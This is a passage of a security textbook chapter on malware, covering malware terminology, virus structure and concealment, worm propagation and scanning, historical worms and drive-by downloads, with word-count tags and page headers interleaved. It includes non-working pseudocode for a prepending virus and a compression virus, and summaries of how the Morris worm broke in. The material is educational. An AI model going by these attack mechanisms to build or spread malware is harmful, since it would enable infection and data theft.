installation foreman, and a receiving clerk. For each role, indicate which items should 
be accessible for read-only and read-write access.
[Word Count: 80]

5.12	
Imagine that you are the database administrator for a military transportation system. 
You have a table named cargo in your database that contains information on the 
various cargo holds available on each outbound airplane. Each row in the table 
represents a single shipment and lists the contents of that shipment and the flight 
identification number. Only one shipment per hold is allowed. The flight identification 
number may be cross-referenced with other tables to determine the origin, destination, 
flight time, and similar data. The cargo table appears as follows:
[Word Count: 89]

Flight ID
Cargo Hold
Contents
Classification
[Word Count: 6]

6.1	 Types of Malicious Software (Malware)
[Word Count: 6]

6.3	 Propagation—Infected Content—Viruses
[Word Count: 3]

6.4	 Propagation—Vulnerability Exploit—Worms
[Word Count: 3]

6.5	 Propagation—Social Engineering—Spam E-Mail, Trojans
[Word Count: 5]

6.8	 Payload—Information Theft—Keyloggers, Phishing, Spyware
[Word Count: 5]

6.9	 Payload—Stealthing—Backdoors, Rootkits
[Word Count: 3]

6.12	 Key Terms, Review Questions, and Problems
[Word Count: 7]

This chapter examines the wide spectrum of malware threats and counter-
measures. We begin with a survey of various types of malware, and offer a broad 
classification based first on the means malware uses to spread or propagate, and 
then on the variety of actions or payloads used once the malware has reached a 
target. Propagation mechanisms include those used by viruses, worms, and ­Trojans. 
Payloads include system corruption, bots, phishing, spyware, and rootkits. The 
­discussion concludes with a review of countermeasure approaches.
[Word Count: 83]

6.1	 Types of Malicious Software (Malware)
[Word Count: 6]

The terminology in this area presents problems because of a lack of universal agree-
ment on all of the terms and because some of the categories overlap. Table 6.1 is a 
useful guide to some of the terms in use.
[Word Count: 40]

A number of authors attempt to classify malware, as shown in the survey and pro-
posal of [HANS04]. Although a range of aspects can be used, one useful approach 
classifies malware into two broad categories, based first on how it spreads or propa-
gates to reach the desired targets; and then on the actions or payloads it performs 
once a target is reached.
[Word Count: 63]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Describe three broad mechanisms malware uses to propagate.
◆	Understand the basic operation of viruses, worms, and Trojans.
◆	Describe four broad categories of malware payloads.
◆	Understand the different threats posed by bots, spyware, and rootkits.
◆	Describe some malware countermeasure elements.
◆	Describe three locations for malware detection mechanisms.
[Word Count: 52]

6.1 / Types of Malicious Software (Malware)   201
[Word Count: 8]

Table 6.1  Terminology for Malicious Software (Malware)
[Word Count: 7]

Cybercrime directed at business and political targets, using a wide variety of intru-
sion technologies and malware, applied persistently and effectively to specific  
targets over an extended period, often attributed to state-sponsored organizations.
[Word Count: 33]

Adware
Advertising that is integrated into software. It can result in pop-up ads or 
­redirection of a browser to a commercial site.
[Word Count: 22]

Attack kit
Set of tools for generating new malware automatically using a variety of supplied 
propagation and payload mechanisms.
[Word Count: 19]

Auto-rooter
Malicious hacker tools used to break into new machines remotely.
[Word Count: 11]

Backdoor (trapdoor)
Any mechanism that bypasses a normal security check; it may allow unauthorized 
access to functionality in a program, or onto a compromised system.
[Word Count: 25]

Downloaders
Code that installs other items on a machine that is under attack. It is normally 
included in the malware code first inserted on to a compromised system to then 
import a larger malware package.
[Word Count: 35]

Drive-by-download
An attack using code in a compromised Web site that exploits a browser 
­vulnerability to attack a client system when the site is viewed.
[Word Count: 25]

Exploits
Code specific to a single vulnerability or set of vulnerabilities.
[Word Count: 11]

Flooders (DoS client)
Used to generate a large volume of data to attack networked computer systems, 
by carrying out some form of denial-of-service (DoS) attack.
[Word Count: 25]

Keyloggers
Captures keystrokes on a compromised system.
[Word Count: 7]

Logic bomb
Code inserted into malware by an intruder. A logic bomb lies dormant until a 
­predefined condition is met; the code then triggers an unauthorized act.
[Word Count: 27]

Macro virus
A type of virus that uses macro or scripting code, typically embedded in a 
­document, and triggered when the document is viewed or edited, to run and 
­replicate itself into other such documents.
[Word Count: 35]

Mobile code
Software (e.g., script, macro, etc) that can be shipped unchanged to a heteroge-
neous collection of platforms and execute with identical semantics.
[Word Count: 24]

Rootkit
Set of hacker tools used after attacker has broken into a computer system and 
gained root-level access.
[Word Count: 18]

Spammer programs
Used to send large volumes of unwanted e-mail.
[Word Count: 10]

Spyware
Software that collects information from a computer and transmits it to another 
system by monitoring keystrokes, screen data, and/or network traffic; or by 
­scanning files on the system for sensitive information.
[Word Count: 32]

Trojan horse
A computer program that appears to have a useful function, but also has a hidden 
and potentially malicious function that evades security mechanisms, sometimes by 
exploiting legitimate authorizations of a system entity that invokes it.
[Word Count: 37]

Virus
Malware that, when executed, tries to replicate itself into other executable 
machine or script code; when it succeeds, the code is said to be infected. When the 
infected code is executed, the virus also executes.
[Word Count: 36]

Worm
A computer program that can run independently and can propagate a complete 
working version of itself onto other hosts on a network, usually by exploiting 
­software vulnerabilities in the target system.
[Word Count: 32]

Zombie, bot
Program activated on an infected machine that is activated to launch attacks on 
other machines.
[Word Count: 17]

Propagation mechanisms include infection of existing executable or inter-
preted content by viruses that is subsequently spread to other systems; exploit of 
software vulnerabilities either locally or over a network by worms or drive-by-
downloads to allow the malware to replicate; and social engineering attacks that 
convince users to bypass security mechanisms to install Trojans, or to respond to 
phishing attacks.
[Word Count: 61]

Earlier approaches to malware classification distinguished between those 
that need a host program, being parasitic code such as viruses, and those that are 
independent, self-contained programs run on the system such as worms, Trojans, 
and bots. Another distinction used was between malware that does not replicate, 
such as Trojans and spam e-mail, and malware that does, including viruses and 
worms.
[Word Count: 60]

Payload actions performed by malware once it reaches a target system can 
include corruption of system or data files; theft of service in order to make the 
­system a zombie agent of attack as part of a botnet; theft of information from the 
system, especially of logins, passwords, or other personal details by keylogging or 
spyware programs; and stealthing where the malware hides its presence on the 
­system from attempts to detect and block it.
[Word Count: 75]

While early malware tended to use a single means of propagation to deliver 
a single payload, as it evolved, we see a growth of blended malware that incorpo-
rates a range of both propagation mechanisms and payloads that increase its ability 
to spread, hide, and perform a range of actions on targets. A blended attack uses 
­multiple methods of infection or propagation, to maximize the speed of contagion 
and the severity of the attack. Some malware even support an update mechanism 
that allows it to change the range of propagation and payload mechanisms utilized 
once it is deployed.
[Word Count: 98]

In the following sections, we survey these various categories of malware, and 
then follow with a discussion of appropriate countermeasures.
[Word Count: 20]

The Zeus crimeware toolkit is a prominent, recent, example of such an attack 
kit, which was used to generate a wide range of very effective, stealthed, malware
[Word Count: 27]

that facilitates a range of criminal activities, in particular capturing and exploit-
ing banking credentials [BINS10]. Other widely used toolkits include Blackhole, 
Sakura, and Phoenix [SYMA13].
[Word Count: 26]

Advanced Persistent Threats (APTs) have risen to prominence in recent years. 
These are not a new type of malware, but rather the well-resourced, persistent 
application of a wide variety of intrusion technologies and malware to selected tar-
gets, usually business or political. APTs are typically attributed to state-sponsored 
organizations, with some attacks likely from criminal enterprises as well. We discuss 
these categories of intruders further in Section 8.1.
[Word Count: 68]

APTs differ from other types of attack by their careful target selection, and 
persistent, often stealthy, intrusion efforts over extended periods. A number of 
high profile attacks, including Aurora, RSA, APT1, and Stuxnet, are often cited as 
examples. They are named as a result of these characteristics:
[Word Count: 47]

• Advanced: Use by the attackers of a wide variety of intrusion technologies
[Word Count: 13]

and malware, including the development of custom malware if required. The 
individual components may not necessarily be technically advanced, but are 
carefully selected to suit the chosen target.
 
• Persistent: Determined application of the attacks over an extended period
[Word Count: 39]

against the chosen target in order to maximize the chance of success. A variety 
of attacks may be progressively, and often stealthily, applied until the target is 
compromised.
[Word Count: 28]

• Threats: Threats to the selected targets as a result of the organized, capable,
[Word Count: 14]

and well-funded attackers intent to compromise the specifically chosen tar-
gets. The active involvement of people in the process greatly raises the threat 
level from that due to automated attacks tools, and also the likelihood of 
­successful attack.
[Word Count: 38]

The aim of these attacks varies from theft of intellectual property or security 
and infrastructure related data to the physical disruption of infrastructure. Techniques 
used include social engineering, spear-phishing emails, and drive-by-downloads 
from selected compromised websites likely to be visited by personnel in the target
[Word Count: 45]

organization. The intent is to infect the target with sophisticated malware with mul-
tiple propagation mechanisms and payloads. Once they have gained initial access to 
systems in the target organization, a further range of attack tools are used to main-
tain and extend their access.
[Word Count: 45]

6.3	 Propagation—Infected Content—Viruses
[Word Count: 3]

The first category of malware propagation concerns parasitic software fragments 
that attach themselves to some existing executable content. The fragment may be 
machine code that infects some existing application, utility, or system program, or 
even the code used to boot a computer system. More recently, the fragment has 
been some form of scripting code, typically used to support active content within 
data files such as Microsoft Word documents, Excel spreadsheets, or Adobe PDF 
documents.
[Word Count: 74]

6.3 / Propagation—Infected Content—Viruses   205
[Word Count: 5]

[AYCO06] states that a computer virus has three parts. More generally, many 
contemporary types of malware also include one or more variants of each of these 
components:
[Word Count: 27]

• Infection mechanism: The means by which a virus spreads or propagates,
[Word Count: 12]

­enabling it to replicate. The mechanism is also referred to as the infection 
vector.
 
• Trigger: The event or condition that determines when the payload is activated
[Word Count: 27]

or delivered, sometimes known as a logic bomb.
 
• Payload: What the virus does, besides spreading. The payload may involve
[Word Count: 20]

damage or may involve benign but noticeable activity.
[Word Count: 8]

During its lifetime, a typical virus goes through the following four phases:
[Word Count: 12]

• Dormant phase: The virus is idle. The virus will eventually be activated by
[Word Count: 14]

some event, such as a date, the presence of another program or file, or the 
capacity of the disk exceeding some limit. Not all viruses have this stage.
 
• Propagation phase: The virus places a copy of itself into other programs or
[Word Count: 42]

into certain system areas on the disk. The copy may not be identical to the 
propagating version; viruses often morph to evade detection. Each infected 
program will now contain a clone of the virus, which will itself enter a propa-
gation phase.
 
• Triggering phase: The virus is activated to perform the function for which it
[Word Count: 56]

was intended. As with the dormant phase, the triggering phase can be caused 
by a variety of system events, including a count of the number of times that 
this copy of the virus has made copies of itself.
 
• Execution phase: The function is performed. The function may be harm-
[Word Count: 50]

less, such as a message on the screen, or damaging, such as the destruction of 
­programs and data files.
[Word Count: 19]

Most viruses that infect executable program files carry out their work in a 
manner that is specific to a particular operating system and, in some cases, specific 
to a particular hardware platform. Thus, they are designed to take advantage of the 
details and weaknesses of particular systems. Macro viruses though, target specific 
document types, which are often supported on a variety of systems.
[Word Count: 63]

Executable Virus Structure  A traditional, machine executable code, virus can 
be prepended or postpended to some executable program, or it can be embedded 
into it in some other fashion. The key to its operation is that the infected program, 
when invoked, will first execute the virus code and then execute the original code 
of the program.
[Word Count: 56]

A very general depiction of virus structure is shown in Figure 6.1a. In this 
case, the virus code, V, is prepended to infected programs, and it is assumed that the 
entry point to the program, when invoked, is the main action block.
[Word Count: 42]

A virus such as the one just described is easily detected because an infected 
version of a program is longer than the corresponding uninfected one. A way to
[Word Count: 28]

procedure attach-to-program;
begin
 
repeat
 
 
file := get-random-program;
 
until first-program-line   1234567;
 
prepend V to file;
end;
[Word Count: 15]

procedure execute-payload;
begin
 
(* perform payload actions *)
end;
[Word Count: 9]

procedure trigger-condition;
begin
 
(* return true if trigger condition is true *)
end;
[Word Count: 13]

begin (* main action block *)
 
attach-to-program;
 
if trigger-condition then execute-payload;
 
goto original program code;
end;
[Word Count: 16]

procedure attach-to-program;
begin
 
repeat
 
 
file := get-random-program;
 
until first-program-line   1234567;
 
compress file;    (* t1 *)
 
prepend CV to file;   (* t2 *)
end;
[Word Count: 23]

begin (* main action block *)
 
attach-to-program;
 
uncompress rest of this file into tempfile;   (* t3 *)
 
execute tempfile;   (* t4 *)
end;
[Word Count: 23]

(a) A simple virus
(b) A compression virus
[Word Count: 8]

6.3 / Propagation—Infected Content—Viruses  207
[Word Count: 5]

thwart such a simple means of detecting a virus is to compress the executable file 
so that both the infected and uninfected versions are of identical length. Figure 6.1b 
shows in general terms the logic required. The key lines in this virus are labeled with 
times, and Figure 6.2 illustrates the operation. We begin at time t0, with program, 
which is program P1 infected with virus CV, and a clean program P2, which is not 
infected with CV. When P1 is invoked, control passes to its virus, which performs 
the following steps:
[Word Count: 92]

t1	 For each uninfected file P2 that is found, the virus first compresses that file to
[Word Count: 16]

produce P′2, which is shorter than the original program by the size of the virus.
	
t2	 A copy of CV is prepended to the compressed program.
	
t3	 The compressed version of the original infected program, P′1, is uncompressed.
	
t4	 The uncompressed original program P1 is executed.
[Word Count: 46]

In this example, the virus does nothing other than propagate. As previously 
mentioned, the virus may also include one or more payloads.
[Word Count: 22]

There has been a continuous arms race between virus writers and writers of 
­anti-virus software since viruses first appeared. As effective countermeasures are 
developed for existing types of viruses, newer types are developed. There is no 
­simple or universally agreed upon classification scheme for viruses. In this section, 
we follow [AYCO06] and classify viruses along two orthogonal axes: the type of 
target the virus tries to infect and the method the virus uses to conceal itself from 
detection by users and anti-virus software.
[Word Count: 83]

A virus classification by target includes the following categories:
[Word Count: 9]

• Boot sector infector: Infects a master boot record or boot record and spreads
[Word Count: 14]

when a system is booted from the disk containing the virus.
 
• File infector: Infects files that the operating system or shell consider to be
[Word Count: 25]

executable.
 
• Macro virus: Infects files with macro or scripting code that is interpreted by an
[Word Count: 16]

application.
 
• Multipartite virus: Infects files in multiple ways. Typically, the multipartite
[Word Count: 12]

­virus is capable of infecting multiple types of files, so that virus eradication 
must deal with all of the possible sites of infection.
[Word Count: 23]

A virus classification by concealment strategy includes the following categories:
[Word Count: 10]

• Encrypted virus: A form of virus that uses encryption to obscure it’s con-
[Word Count: 14]

tent. A portion of the virus ­creates a random encryption key and encrypts 
the remainder of the virus. The key is stored with the virus. When an infected 
­program is invoked, the virus uses the stored random key to decrypt the virus. 
When the virus ­replicates, a different random key is selected. Because the bulk 
of the virus is encrypted with a different key for each instance, there is no con-
stant bit ­pattern to ­observe.
 
• Stealth virus: A form of virus explicitly designed to hide itself from detection
[Word Count: 90]

by anti-virus software. Thus, the entire virus, not just a payload is hidden. It 
may use code mutation, compression, or rootkit techniques to achieve this.
 
• Polymorphic virus: A form of virus that creates copies during replication that
[Word Count: 38]

are functionally equivalent but have distinctly different bit patterns, in order
[Word Count: 11]

6.3 / Propagation—Infected Content—Viruses   209
[Word Count: 5]

to defeat ­programs that scan for viruses. In this case, the “signature” of the 
virus will vary with each copy. To achieve this variation, the virus may ran-
domly insert superfluous instructions or interchange the order of independent 
instructions. A more effective approach is to use encryption. The strategy of 
the encryption virus is followed. The portion of the virus that is responsible 
for generating keys and performing encryption/decryption is referred to as the 
mutation engine. The mutation engine itself is altered with each use.
 
• Metamorphic virus: As with a polymorphic virus, a metamorphic virus ­mutates
[Word Count: 97]

with every infection. The difference is that a metamorphic virus ­rewrites ­itself 
completely at each iteration, using multiple transformation techniques, increas-
ing the difficulty of detection. Metamorphic viruses may change their behavior 
as well as their appearance.
[Word Count: 37]

In the mid-1990s, macro or scripting code viruses became by far the most prevalent 
type of virus. Macro viruses infect scripting code used to support active content in 
a variety of user document types. Macro viruses are particularly threatening for a 
number of reasons:
[Word Count: 44]

1.	 A macro virus is platform independent. Many macro viruses infect active
[Word Count: 12]

­content in commonly used applications, such as macros in Microsoft Word 
documents or other Microsoft Office documents, or scripting code in Adobe 
PDF documents. Any hardware platform and operating system that supports 
these applications can be infected.
	
2.	 Macro viruses infect documents, not executable portions of code. Most of the
[Word Count: 50]

information introduced onto a computer system is in the form of documents 
rather than programs.
	
3.	 Macro viruses are easily spread, as the documents they exploit are shared in
[Word Count: 29]

normal use. A very common method is by electronic mail.
	
4.	 Because macro viruses infect user documents rather than system programs,
[Word Count: 21]

traditional file system access controls are of limited use in preventing their 
spread, since users are expected to modify them.
[Word Count: 20]

Macro viruses take advantage of support for active content using a scripting or 
macro language, embedded in a word processing document or other type of file. 
Typically, users employ macros to automate repetitive tasks and thereby save key-
strokes. They are also used to support dynamic content, form validation, and other 
useful tasks associated with these documents.
[Word Count: 57]

Successive releases of MS Office products provide increased protection 
against macro viruses. For example, Microsoft offers an optional Macro Virus Pro-
tection tool that detects suspicious Word files and alerts the customer to the poten-
tial risk of opening a file with macros. Various anti-virus product vendors have also 
­developed tools to detect and remove macro viruses. As in other types of malware, 
the arms race continues in the field of macro viruses, but they no longer are the 
predominant malware threat.
[Word Count: 82]

Another possible host for macro virus–style malware is in Adobe’s PDF docu-
ments. These can support a range of embedded components, including Javascript 
and other types of scripting code. Although recent PDF viewers include measures to 
warn users when such code is run, the message the user is shown can be manipulated 
to trick them into permitting its execution. If this occurs, the code could potentially 
act as a virus to infect other PDF documents the user can access on their system. 
Alternatively, it can install a Trojan, or act as a worm, as we discuss later [STEV11].
[Word Count: 98]

6.4	 Propagation—Vulnerability Exploit—Worms
[Word Count: 3]

The concept of a computer worm was introduced in John Brunner’s 1975 SF 
novel The Shockwave Rider. The first known worm implementation was done in 
Xerox Palo Alto Labs in the early 1980s. It was nonmalicious, searching for idle 
systems to use to run a computationally intensive task.
[Word Count: 48]

To replicate itself, a worm uses some means to access remote systems. These 
include the following, most of which are still seen in active use [SYMA13]:
[Word Count: 26]

• Electronic mail or instant messenger facility: A worm e-mails a copy of itself to
[Word Count: 15]

other systems, or sends itself as an attachment via an instant message service, so 
that its code is run when the e-mail or attachment is received or viewed.
 
• File sharing: A worm either creates a copy of itself or infects other suitable
[Word Count: 43]

files as a virus on removable media such as a USB drive; it then executes when 
the drive is connected to another system using the autorun mechanism by 
exploiting some software vulnerability, or when a user opens the infected file 
on the target system.
[Word Count: 44]

• Remote execution capability: A worm executes a copy of itself on another
[Word Count: 13]

system, either by using an explicit remote execution facility or by exploiting a 
program flaw in a network service to subvert its operations (as we discuss in 
Chapters 10 and 11).
 
• Remote file access or transfer capability: A worm uses a remote file access or
[Word Count: 46]

transfer service to another system to copy itself from one system to the other, 
where users on that system may then execute it.
 
• Remote login capability: A worm logs onto a remote system as a user and then
[Word Count: 39]

uses commands to copy itself from one system to the other, where it then ­executes.
[Word Count: 15]

6.4 / Propagation—Vulnerability Exploit—Worms   211
[Word Count: 5]

The new copy of the worm program is then run on the remote system where, in 
addition to any payload functions that it performs on that system, it continues to 
propagate.
[Word Count: 31]

A worm typically uses the same phases as a computer virus: dormant, propa-
gation, triggering, and execution. The propagation phase generally performs the 
following functions:
[Word Count: 25]

• Search for appropriate access mechanisms to other systems to infect by exam-
[Word Count: 13]

ining host tables, address books, buddy lists, trusted peers, and other similar 
repositories of remote system access details; by scanning possible target host 
addresses; or by searching for suitable removable media devices to use.
 
• Use the access mechanisms found to transfer a copy of itself to the remote
[Word Count: 49]

The worm may also attempt to determine whether a system has previously 
been infected before copying itself to the system. In a multiprogramming system, 
it can also disguise its presence by naming itself as a system process or using some 
other name that may not be noticed by a system operator. More recent worms can 
even inject their code into existing processes on the system, and run using additional 
threads in that process, to further disguise their presence.
[Word Count: 78]

The first function in the propagation phase for a network worm is for it to search 
for other systems to infect, a process known as scanning or fingerprinting. For 
such worms, which exploit software vulnerabilities in remotely accessible network 
­services, it must identify potential systems running the vulnerable service, and then 
infect them. Then, typically, the worm code now installed on the infected machines 
repeats the same scanning process, until a large distributed network of infected 
machines is created.
[Word Count: 79]

[MIRK04] lists the following types of network address scanning strategies that 
such a worm can use:
[Word Count: 16]

• Random: Each compromised host probes random addresses in the IP ­address
[Word Count: 12]

space, using a different seed. This technique produces a high volume of Inter-
net traffic, which may cause generalized disruption even before the ­actual 
attack is launched.
 
• Hit-List: The attacker first compiles a long list of potential vulnerable machines.
[Word Count: 40]

This can be a slow process done over a long period to avoid detection that 
an attack is underway. Once the list is compiled, the attacker begins infecting 
machines on the list. Each infected machine is provided with a portion of the 
list to scan. This strategy results in a very short scanning period, which may 
make it difficult to detect that infection is taking place.
 
• Topological: This method uses information contained on an infected victim
[Word Count: 77]

machine to find more hosts to scan.
 
• Local subnet: If a host can be infected behind a firewall, that host then looks
[Word Count: 23]

for targets in its own local network. The host uses the subnet address structure 
to find other hosts that would otherwise be protected by the firewall.
[Word Count: 26]

A well-designed worm can spread rapidly and infect massive numbers of hosts. It is 
useful to have a general model for the rate of worm propagation. Computer viruses 
and worms exhibit similar self-replication and propagation behavior to biological 
viruses. Thus we can look to classic epidemic models for understanding computer 
virus and worm propagation behavior. A simplified, classic epidemic model can be 
expressed as follows:
[Word Count: 65]

I(t)	 =	 number of individuals infected as of time t
	S(t)	 =	 number of susceptible individuals (susceptible to infection but not yet
[Word Count: 22]

infected) at time t
	 b	 =	 infection rate
	 N	 =	 size of the population, N = I(t) + S(t)
[Word Count: 19]

6.4 / Propagation—Vulnerability Exploit—Worms   213
[Word Count: 5]

infected, the attack enters a slow finish phase as the worm seeks out those remain-
ing hosts that are difficult to identify.
[Word Count: 22]

Clearly, the objective in countering a worm is to catch the worm in its slow 
start phase, at a time when few hosts have been infected.
[Word Count: 26]

Zou, et al [ZOU05] describe a model for worm propagation based on an anal-
ysis of network worm attacks at that time. The speed of propagation and the total 
number of hosts infected depend on a number of factors, including the mode of 
propagation, the vulnerability or vulnerabilities exploited, and the degree of simi-
larity to preceding attacks. For the latter factor, an attack that is a variation of a 
recent previous attack may be countered more effectively than a more novel attack. 
Zou’s model agrees closely with Figure 6.3.
[Word Count: 90]

1.	 It attempted to log on to a remote host as a legitimate user. In this method, the
[Word Count: 18]

worm first attempted to crack the local password file and then used the discov-
ered passwords and corresponding user IDs. The assumption was that many 
users would use the same password on different systems. To obtain the pass-
words, the worm ran a password-cracking program that tried:
[Word Count: 47]

a.	 Each user’s account name and simple permutations of it
b.	A list of 432 built-in passwords that Morris thought to be likely candidates1
[Word Count: 24]

c.	 All the words in the local system dictionary
[Word Count: 9]

2.	 It exploited a bug in the UNIX finger protocol, which reports the whereabouts
[Word Count: 14]

of a remote user.
	
3.	 It exploited a trapdoor in the debug option of the remote process that receives
[Word Count: 19]

If any of these attacks succeeded, the worm achieved communication with the 
operating system command interpreter. It then sent this interpreter a short boot-
strap program, issued a command to execute that program, and then logged off. 
The bootstrap program then called back the parent program and downloaded the 
remainder of the worm. The new worm was then executed.
[Word Count: 59]

1The complete list is provided at this book’s Web site.
[Word Count: 10]

The Melissa e-mail worm that appeared in 1998 was the first of a new generation of 
malware that included aspects of virus, worm, and Trojan in one package [CASS01]. 
Melissa made use of a Microsoft Word macro embedded in an attachment. If the 
recipient opens the e-mail attachment, the Word macro is activated. Then it:
[Word Count: 55]

1.	 Sends itself to everyone on the mailing list in the user’s e-mail package, propa-
[Word Count: 15]

gating as a worm; and
	
2.	 Does local damage on the user’s system, including disabling some secu-
[Word Count: 17]

rity tools, and also copying itself into other documents, propagating as a  
virus; and
	
3.	 If a trigger time was seen, it displayed a Simpson quote as its payload.
[Word Count: 29]

In 1999, a more powerful version of this e-mail virus appeared. This ver-
sion could be activated merely by opening an e-mail that contains the virus, rather 
than by opening an attachment. The virus uses the Visual Basic scripting language 
­supported by the e-mail package.
[Word Count: 45]

Code Red II is another, distinct, variant that first appeared in August 2001, 
and also targeted Microsoft IIS. It tried to infect systems on the same subnet as the 
infected system. Also, this newer worm installs a backdoor, allowing a hacker to 
remotely execute commands on victim computers.
[Word Count: 48]

The Nimda worm that appeared in September 2001 also has worm, virus, and 
mobile code characteristics. It spread using a variety of distribution methods:
[Word Count: 24]

• E-mail: A user on a vulnerable host opens an infected e-mail attachment;
[Word Count: 13]

Nimda looks for e-mail addresses on the host and then sends copies of itself to 
those addresses.
 
• Windows shares: Nimda scans hosts for unsecured Windows file shares; it can
[Word Count: 30]

then use NetBIOS86 as a transport mechanism to infect files on that host in
[Word Count: 14]

6.4 / Propagation—Vulnerability Exploit—Worms   215
[Word Count: 5]

the hopes that a user will run an infected file, which will activate Nimda on 
that host.
 
• Web servers: Nimda scans Web servers, looking for known vulnerabilities in
[Word Count: 29]

Microsoft IIS. If it finds a vulnerable server, it attempts to transfer a copy of 
itself to the server and infects it and its files.
 
• Web clients: If a vulnerable Web client visits a Web server that has been
[Word Count: 40]

infected by Nimda, the client’s workstation will become infected.
 
• Backdoors: If a workstation was infected by earlier worms, such as “Code
[Word Count: 22]

Red II,” then Nimda will use the backdoor access left by these earlier infec-
tions to access the system.
[Word Count: 19]

In early 2003, the SQL Slammer worm appeared. This worm exploited a 
buffer overflow vulnerability in Microsoft SQL server. The Slammer was extremely 
­compact and spread rapidly, infecting 90% of vulnerable hosts within 10 minutes. 
This rapid spread caused significant congestion on the Internet.
[Word Count: 44]

Late 2003 saw the arrival of the Sobig.F worm, which exploited open proxy 
servers to turn infected machines into spam engines. At its peak, Sobig.F reportedly 
accounted for one in every 17 messages and produced more than one million copies 
of itself within the first 24 hours.
[Word Count: 47]

Mydoom is a mass-mailing e-mail worm that appeared in 2004. It followed 
the growing trend of installing a backdoor in infected computers, thereby enabling 
hackers to gain remote access to data such as passwords and credit card numbers. 
Mydoom replicated up to 1,000 times per minute and reportedly flooded the Inter-
net with 100 million infected messages in 36 hours.
[Word Count: 60]

The Warezov family of worms appeared in 2006 [KIRK06]. When the worm 
is launched, it creates several executables in system directories and sets itself to 
run every time Windows starts by creating a registry entry. Warezov scans ­several 
types of files for e-mail addresses and sends itself as an e-mail attachment. Some 
­variants are capable of downloading other malware, such as Trojan horses and 
adware. Many variants disable security-related products and/or disable their 
updating capability.
[Word Count: 75]

The Conficker (or Downadup) worm was first detected in November 2008 
and spread quickly to become one of the most widespread infections since SQL 
­Slammer in 2003 [LAWT09]. It spread initially by exploiting a Windows buffer 
overflow vulnerability, though later versions could also spread via USB drives and 
network file shares. Recently, it still comprised the second most common family of 
malware observed by Symantec [SYMA13], even though patches were available 
from Microsoft to close the main vulnerabilities it exploits.
[Word Count: 80]

in its development. There are claims that it appears to be the first serious use of a 
cyberwarfare weapon against a nation’s physical infrastructure. The researchers who 
analyzed Stuxnet noted that while they were expecting to find espionage, they never 
expected to see malware with targeted sabotage as its aim. As a result, greater atten-
tion is now being directed at the use of malware as a weapon by a number of nations.
[Word Count: 73]

The state of the art in worm technology includes the following:
[Word Count: 11]

• Multiplatform: Newer worms are not limited to Windows machines but can
[Word Count: 12]

­attack a variety of platforms, especially the popular varieties of UNIX; or 
­exploit macro or scripting languages supported in popular document types.
 
• Multi-exploit: New worms penetrate systems in a variety of ways, using exploits
[Word Count: 35]

against Web servers, browsers, e-mail, file sharing, and other network-based 
applications; or via shared media.
 
• Ultrafast spreading: Exploit various techniques to optimize the rate of spread
[Word Count: 27]

of a worm to maximize its likelihood of locating as many vulnerable machines 
as possible in a short time period.
 
• Polymorphic: To evade detection, skip past filters, and foil real-time analy-
[Word Count: 32]

sis, worms adopt virus polymorphic techniques. Each copy of the worm has 
new code generated on the fly using functionally equivalent instructions and 
encryption techniques.
 
• Metamorphic: In addition to changing their appearance, metamorphic worms
[Word Count: 35]

have a repertoire of behavior patterns that are unleashed at different stages of 
propagation.
 
• Transport vehicles: Because worms can rapidly compromise a large number of
[Word Count: 26]

systems, they are ideal for spreading a wide variety of malicious payloads, such as 
distributed denial-of-service bots, rootkits, spam e-mail generators, and spyware.
 
• Zero-day exploit: To achieve maximum surprise and distribution, a worm
[Word Count: 34]

should exploit an unknown vulnerability that is only discovered by the general 
network community when the worm is launched.
[Word Count: 19]

Mobile code refers to programs (e.g., script, macro, or other portable instruction) 
that can be shipped unchanged to a heterogeneous collection of platforms and 
­execute with identical semantics [JANS08].
[Word Count: 29]

6.4 / Propagation—Vulnerability Exploit—Worms   217
[Word Count: 5]

The CommWarrior worm replicates by means of Bluetooth to other phones 
in the receiving area. It also sends itself as an MMS file to numbers in the phone’s 
address book and in automatic replies to incoming text messages and MMS mes-
sages. In addition, it copies itself to the removable memory card and inserts itself 
into the program installation files on the phone.
[Word Count: 63]

Although these examples demonstrate that mobile phone worms are possible, 
the vast majority of mobile phone malware observed use trojan apps to install them-
selves [SYMA13].
[Word Count: 26]

Client-Side Vulnerabilities and Drive-by-Downloads
[Word Count: 4]

In general, drive-by-download attacks are aimed at anyone who visits a com-
promised site and is vulnerable to the exploits used. Watering-hole attacks are a 
variant of this used in highly targeted attacks [SYMA13]. The attacker researches 
their intended victims to identify web sites they are likely to visit, and then scans 
these sites to identify those with vulnerabilities that allow their compromise with 
a drive-by-download attack. They then wait for one of their intended victims to 
visit one of the compromised sites. Their attack code may even be written so that it
[Word Count: 93]

will only infect systems belonging to the target organization, and take no action for 
other visitors to the site. This greatly increases the likelihood of the site compromise 
remaining undetected.
[Word Count: 30]

Malvertising is another technique used to place malware on websites without 
actually compromising them [SYMA13]. The attacker pays for advertisements that 
are highly likely to be placed on their intended target websites, and which incorpo-
rate malware in them. Using these malicious adds, attackers can infect visitors to 
sites displaying them. Again, the malware code may be dynamically generated to 
either reduce the chance of detection, or to only infect specific systems.
[Word Count: 72]

Related variants can exploit bugs in common e-mail clients, such as the Klez 
mass-mailing worm seen in October 2001, which targeted a bug in the HTML 
­handling in Microsoft’s Outlook and Outlook Express programs to automatically 
run itself. Or, such malware may target common PDF viewers to also download and 
install malware without the user’s consent when they view a malicious PDF docu-
ment [STEV11]. Such documents may be spread by spam e-mail, or be part of a 
targeted phishing attack, as we discuss in the next section.
[Word Count: 88]

Using a similar technique, keystrokes can also be hijacked. With a carefully 
crafted combination of stylesheets, iframes, and text boxes, a user can be led to 
believe they are typing in the password to their email or bank account, but are 
instead typing into an invisible frame controlled by the attacker.
[Word Count: 51]

There is a wide variety of techniques for accomplishing a clickjacking attack, 
and new techniques are developed as defenses to older techniques are put in place. 
[NIEM11] and [STON10] are useful discussions.
[Word Count: 32]

6.5	 Propagation—Social Engineering—Spam E-Mail,
[Word Count: 4]

The final category of malware propagation we consider involves social engineer-
ing, “tricking” users to assist in the compromise of their own systems or personal 
information. This can occur when a user views and responds to some SPAM 
e-mail, or permits the installation and execution of some Trojan horse program or 
scripting code.
[Word Count: 53]

6.5 / Propagation—Social Engineering—Spam E-Mail, Trojans   219
[Word Count: 7]

In recent years, the volume of spam e-mail has started to decline. One reason 
is the rapid growth of attacks, including spam, spread via social media networks. 
This reflects the rapid growth in use of these networks, which form a new arena for 
attackers to exploit [SYMA13].
[Word Count: 47]

A Trojan horse2 is a useful, or apparently useful, program or utility containing 
­hidden code that, when invoked, performs some unwanted or harmful function.
[Word Count: 24]

Trojan horse programs can be used to accomplish functions indirectly that 
